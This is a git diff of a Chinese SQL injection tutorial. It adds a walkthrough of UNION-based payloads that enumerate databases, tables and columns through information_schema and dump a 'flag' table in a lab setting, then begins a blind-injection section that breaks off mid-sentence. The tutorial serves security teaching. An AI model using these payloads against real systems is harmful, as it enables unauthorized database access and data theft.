@@ -1,6 +1,6 @@
 # SQL注入详解
 
-`更新时间 2025-9-1`
+`更新时间 2025-9-5`
 
 ## 概述
 
@@ -383,11 +383,11 @@ echo "用户: " . $row['username'] . "<br>";
 
 | 字段名                         | 含义                 | 备注                                                       |
 | ------------------------------ | -------------------- | ---------------------------------------------------------- |
-| **CATALOG_NAME**               | 目录名               | 在MySQL中通常固定为def，表示默认目录                       |
+| **CATALOG_NAME**               | 目录名               | 在MySQL中通常固定为`def`，表示默认目录                     |
 | **SCHEMA_NAME**                | 数据库名             |                                                            |
 | **DEFAULT_CHARACTER_SET_NAME** | 数据库的默认字符集   | 指定了该数据库中新建表和字段时默认使用的字符编码           |
 | **DEFAULT_COLLATION_NAME**     | 数据库的默认排序规则 | 决定了字符串比较、排序和搜索时的大小写敏感性及字符排序规则 |
-| **SQL_PATH**                   | SQL路径              | 保留字段，可能在某些特定环境或未来版本中有用，通常为NULL   |
+| **SQL_PATH**                   | SQL路径              | 保留字段，可能在某些特定环境或未来版本中有用，通常为`NULL` |
 | **DEFAULT_ENCRYPTION**         | 数据库的默认加密选项 | 指示在该数据库中创建的新表是否默认启用加密                 |
 
 对于攻击者来说，可以利用`information_schema.schemata`的`SCHEMA_NAME`来查询所有的数据库名
@@ -398,7 +398,7 @@ echo "用户: " . $row['username'] . "<br>";
 
 | 字段名              | 含义                       | 备注                                                         |
 | ------------------- | -------------------------- | ------------------------------------------------------------ |
-| **TABLE_CATALOG**   | 目录名                     | 在MySQL中通常固定为def，表示默认目录                         |
+| **TABLE_CATALOG**   | 目录名                     | 在MySQL中通常固定为`def`，表示默认目录                       |
 | **TABLE_SCHEMA**    | 数据库名                   | 表示该表所属的数据库                                         |
 | **TABLE_NAME**      | 数据表名                   |                                                              |
 | **TABLE_TYPE**      | 表类型                     | 一般有普通表`BASE TABLE`与视图`VIEW`                         |
@@ -411,14 +411,121 @@ echo "用户: " . $row['username'] . "<br>";
 | **MAX_DATA_LENGTH** | 表允许的最大数据长度       | 通常为0，表示没有长度限制                                    |
 | **INDEX_LENGTH**    | 索引部分占用的总字节数     |                                                              |
 | **DATA_FREE**       | 已分配但是未使用的存储空间 | 通常表示碎片空间或预留给未来数据增长的空间                   |
-| **AUTO_INCREMENT**  | 自动增长的下一个值         | 若没有自动增长，则为NULL                                     |
+| **AUTO_INCREMENT**  | 自动增长的下一个值         | 若没有自动增长，则为`NULL`                                   |
 | **CREATE_TIME**     | 表创建时间                 |                                                              |
 | **UPDATE_TIME**     | 表更新时间                 |                                                              |
-| **CHECK_TIME**      | 表最后检查时间             | `MyISAM`等引擎会更新此值，`InnoDB`通常为NULL                 |
+| **CHECK_TIME**      | 表最后检查时间             | `MyISAM`等引擎会更新此值，`InnoDB`通常为`NULL`               |
 | **TABLE_COLLATION** | 表默认字符集与排序规则     |                                                              |
-| **CHECKSUM**        | 表校验和                   | 如果启用了表校验和，这里会存储校验和值。未启用则为NULL       |
+| **CHECKSUM**        | 表校验和                   | 如果启用了表校验和，这里会存储校验和值。未启用则为`NULL`     |
 | **CREATE_OPTIONS**  | 表创建时指定的额外选项     |                                                              |
 | **TABLE_COMMENT**   | 表注释                     |                                                              |
 
 对于攻击者来说，可以利用`information_schema.tables`的`TABLE_NAME`来查询所有的数据表名
+
+**information_schema.columns**
+
+`information_schema.`中存储的是当前DBMS中的所有字段的信息，包括
+
+| 字段名                       | 含义                         | 备注                                           |
+| ---------------------------- | ---------------------------- | ---------------------------------------------- |
+| **TABLE_CATALOG**            | 目录名                       | 在MySQL中通常固定为`def`，表示默认目录         |
+| **TABLE_SCHEMA**             | 数据库名                     | 表示字段所属的数据库                           |
+| **TABLE_NAME**               | 表名                         | 表示字段所属的数据表                           |
+| **COLUMN_NAME**              | 字段名                       |                                                |
+| **ORDINAL_POSITION**         | 字段序号                     | 从1开始                                        |
+| **COLUMN_DEFAULT**           | 字段默认值                   | 可以在创建表时定义，默认为`NULL`               |
+| **IS_NULLABLE**              | 是否允许为NULL               |                                                |
+| **DATA_TYPE**                | 字段数据类型                 |                                                |
+| **CHARACTER_MAXIMUM_LENGTH** | 字符型字段允许的最大字符长度 | 非字符类型为`NULL`                             |
+| **CHARACTER_OCTET_LENGTH**   | 字符型字段允许的最大字节长度 | 非字符类型为`NULL`                             |
+| **NUMERIC_PRECISION**        | 数值型字段的精度             |                                                |
+| **NUMERIC_SCALE**            | 数值型字段的小数位数         |                                                |
+| **DATETIME_PRECISION**       | 日期时间型字段的小数秒精度   |                                                |
+| **CHARACTER_SET_NAME**       | 字符型字段的字符集           |                                                |
+| **COLLATION_NAME**           | 字符型字段的排序规则         |                                                |
+| **COLUMN_TYPE**              | 字段的完整数据类型定义       | 包含长度、精度等                               |
+| **COLUMN_KEY**               | 字段索引类型                 |                                                |
+| **EXTRA**                    | 字段额外信息                 | 如`AUTO_INCREMENT`                             |
+| **PRIVILEGES**               | 当前用户对字段拥有的权限     | 如`SELECT`、`INSERT`、`UPDATE`、`REFERENCES`等 |
+| **COLUMN_COMMENT**           | 字段注释                     |                                                |
+| **GENERATION_EXPRESSION**    | 生成表达式                   | 非生成列均为`NULL`                             |
+| **SRS_ID**                   | 空间参考系统ID               | 非空间类型的字段均为`NULL`                     |
+
+对于攻击者来说，可以利用`information_schema.columns`的`COLUMN_NAME`来查询所有的数据表名
+
+在上文给出的字段中，对于攻击者来说，重要的只有`SCHEMA_NAME`、`TABLE_NAME`以及`COLUMN_NAME`，现在我们来尝试依次查询
+
+```sql
+' UNION SELECT SCHEMA_NAME,2,3 FROM information_schema.schemata#
+```
+
+> <img src="./img3/{FCE2AA1F-4669-419F-ADCD-2430F99FD1D8}.png">
+
+**为什么只显示mysql？**
+
+我们先尝试直接在MySQL中直接进行查询
+
+> <img src="./img3/{AF224DA9-3428-48F2-A80D-A424447CA6F6}.png">
+
+不难发现，获取的结果是一张表，而前端只显示其中的一条记录，因此我们需要让一张表变为一行
+
+**GROUP_CONCAT()**
+
+`GROUP_CONCAT()`是SQL中的一个聚合函数，它用于将来自某个分组的多个行的列值连接成一个单独的字符串
+
+> <img src="./img3/{CAB2652F-C878-43CF-A0A9-8641D8BD666B}.png">
+
+很显然，`GROUP_CONCAT`将`SCHEMA_NAME`的所有记录连接成为了一个单独的字符串，并用逗号分隔
+
+###### 泄露数据库
+
+```sql
+' UNION SELECT GROUP_CONCAT(SCHEMA_NAME),2,3 FROM information_schema.schemata#
+```
+
+> <img src="./img3/{CF3C8ED2-687D-4F08-9CD0-4378E9079EED}.png">
+
+在获得的所有数据库中，`mysql`、`information_schema`、`performance_schema`、`sys`都是系统自带表，一般可以直接忽略
+
+###### 泄露数据表
+
+在泄露的数据库中，我们选择`test`库继续注入攻击，泄露`test`库中的所有数据表
+
+```sql
+' UNION SELECT GROUP_CONCAT(TABLE_NAME),DATABASE(),3 FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE()#
+```
+
+> <img src="./img3/{39782DB5-FE55-4A78-9FA5-F14BE96BE95F}.png">
+
+这里需要注意，在`information_schema.tables`中，表所属数据库的字段名为`TABLE_SCHEMA`，而不是之前的`SCHEMA_NAME`，而且因为当前数据库正好是`test`，所以可以使用`DATABASE()`来代替
+
+###### 泄露字段名
+
+在`test`中，我们发现了`flag`表，那么`flag`一定就在其中，下一步就是查询`flag`表中的字段名
+
+```sql
+' UNION SELECT GROUP_CONCAT(COLUMN_NAME),DATABASE(),3 FROM information_schema.columns WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='flag'#
+```
+
+> <img src="./img3/{A0CA00F8-B638-4717-A16D-68BD21559B0F}.png">
+
+###### 泄露字段值
+
+现在已知`flag`表中仅有`flag`一个字段，因此我们通过`UNION`联合查询直接查询其中的内容
+
+```sql
+' UNION SELECT flag,2,3 FROM flag#
+```
+
+> <img src="./img3/{283008DE-405A-4C01-B49B-745268DA8E77}.png">
+
+最终，我们成功获取了`flag`
+
+#### SQL盲注
+
+大多数实际的查询页面中，不会在前端显示报错信息，这会导致我们无法根据报错来判断注入点、回显点、字段数量等。但聪明的攻击者并不会因此放弃攻击，而是选择不需要查看报错的攻击方式，即SQL盲注。SQL盲注并不依靠数据库本身的报错信息，而是根据前端服务器的响应来判断`payload`的执行情况
+
+SQL盲注主要
+
+##### 布尔盲注
 
